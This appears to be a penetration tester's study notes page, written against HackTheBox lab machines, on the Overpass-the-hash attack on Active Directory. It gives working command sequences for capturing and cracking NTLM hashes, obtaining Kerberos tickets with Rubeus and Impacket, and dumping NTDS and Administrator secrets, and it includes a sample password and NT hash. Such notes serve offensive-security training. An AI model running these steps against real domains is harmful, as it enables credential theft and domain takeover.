---
description: Using a NT hash to obtain Kerberos tickets
---

# Overpass-the-hash Attack

## Methodology&#x20;

[https://www.thehacker.recipes/ad/movement/kerberos/ptk](https://www.thehacker.recipes/ad/movement/kerberos/ptk)&#x20;

To execute the overpass the hash attack, get **NTLM** and Password first, and get **Kerberos Tickets via NTLM hash** and **password**.&#x20;

* _See_ [_NTLM Poisoning - Responder_ ](../init-ntlmv2-theft.md)_section._&#x20;
* For SMB protocol, here is a quick way to grab Net-NTLM-v2 hash and crack it

```bash
# Kali 
Kali> smbserver.py -smb2support smb .

# Windows 
CMD> type null > hello.txt
CMD> copy hello.txt \\10.10.14.107\smb 

# Kali
vi hashes.txt # and copy and past it 
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# or
hashcat hashes.txt /usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

## &#x20;Kerberos Tickets

#### For current user without password, use Rebeus.&#x20;

{% code overflow="wrap" %}
```bash
# Run the command to get TGT for curren user
# Rubeus shows base64 format of Kerberos ticket. 
CMD> .\Rubeus.exe tgtdeleg /nowrap

# @Kali
# Copy ticket to a file
vi kirbi.b64 

# decode base64 file -> binary format used for mimikatz
base64 -d kirbi.b64 > ticket.kirbi 

# Convert the kirbi to ccache for impacket and metasploit  
impacket-ticketConverter ticket.kirbi G0.ccache

# Inject the ticket into memory
export KRB5CCNAME=G0.ccache   # This is the case of Machine certificate

# Modify clock SKEW issue 
sudo ntpdate 10.129.228.120

# Validate if you can use the ticket 
cme smb g0.flight.htb -k --use-kcache    # g0.flight.htb is the target machine 

# Grab all NTDS content with the ticket 
cme smb g0.flight.htb -k --use-kcache --ntds drsuapi

# DirSync with ticket 
impacket-secretsdump -no-pass -k g0.flight.htb -just-dc-user Administrator
```
{% endcode %}

#### For user with password or NTLM hash, you could use Impact tools.&#x20;

{% code overflow="wrap" %}
```bash
#impact-getTGT
impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip $RHOST
impacket-getTGT ignite.local/yashika -hashes :64fbae31cc352fc26af97cbdef151e03 -dc-ip $RHOST

# Inject the ticket into memory
export KRB5CCNAME=d.klay.ccache

# The rest of the attack is the same as above.  
```
{% endcode %}

